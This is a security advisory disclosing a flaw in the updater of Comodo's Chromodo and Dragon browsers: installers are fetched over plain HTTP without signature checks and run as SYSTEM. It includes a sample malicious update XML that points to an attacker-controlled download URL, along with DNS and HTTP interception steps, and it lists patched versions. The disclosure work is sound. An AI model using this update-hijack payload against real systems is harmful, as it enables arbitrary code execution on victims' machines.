SRT-VR-08OCT2015: Comodo Chromodo chromodo_update.exe Unsigned Update Installation

Severity:
MEDIUM (MiTM Assisted RCE)


Systems Affected:
* Comodo Chromodo < v48.12.18.238
* Comodo Dragon < v48.12.18.243
NOTE: Chromodo included and set as default browser in default installations of Comodo Internet Security
   - Tested Against 8.2.0.4703


Description:
A remote code execution vulnerability exists within Comodo Chromodo / Dragon that allows a malicious 
MiTM actor (or someone able to manipulate the DNS resolutions for a targetted user) to execute 
arbitrary code as NT AUTHORITY\SYSTEM. The vulnerability is due to the lack of any code-signing 
signature validation of installer packages. This issue is especially ironic since Comodo issue 
code-signing certificates as part of their business.

Chromodo is set as the default browser upon installed Comodo Internet Security (CIS), and goes so 
far as even replacing Google Chrome shortcuts with Chromodo on the desktop and Start Menu. While 
this vulnerability is not necessarily part of the CIS code base, from our testing, it came along for
the ride and puts default unpatched CIS installations at risk.

  
Technical Description:
Updates for Comodo's browser, Chromodo, are performed automatically or whenever a user launches the 
browser and goes to the "About Chromodo" option and selects update browser. In the former case, no
user interaction is requested or required ; in the later, the user must agree to the update.

As part of the update routine, the chromodo_updater.exe service is instantiated and will download 
chromodo.inf from http://download.comodo.com/browser/update/chromodo/chromodo/chromodo.inf 
(NOTE: no use of SSL certificate, of which the vendor also sells).
This inf is an XML file that declares what version of Chromodo is available, and the full 
(non-relative) URL to grab the installer binary.

Upon checking the latest advertised version available, if it is higher than the currently-installed 
version, Chromodo_Installer.exe will download and execute this file. No checking of any code-signing 
or HTTPS SSL certificate takes place, and the binary is executed as SYSTEM with the --need-show-eula 
CLI flag.

An example of a rudimentary "exploit" inf response might look like the following:
"""
<?xml version='1.0' encoding='UTF-8'?>
<DragonVersion version='57.9.12.400' url='http://toolegittoclick.com/putty.exe'/>
"""

An attacker that is able to either (1) adjust the DNS resolution for download.comodo.com, or (2) 
adjust the HTTP response would be able to manipulate the version and the URL of the software. If the 
attacker were to point a higher version of software available at a URL they control, they could 
easily execute an arbitrary PE as NT AUTHORITY\SYSTEM.


Researcher Commentary:
Based on the slow vendor response time and other issues discovered in the Chomodo suite by Google's 
Project Zero (https://code.google.com/p/google-security-research/issues/detail?id=704), this 
researcher recommends not using the Chromodo add-on and uninstalling it from CIS installations if
that is the AV chosen.


Mitigation / Protection:
Upgrade your affected software suites to the following or greater:
* Comodo Dragon v48.12.18.243
* Comodo Chromodo v48.12.18.238
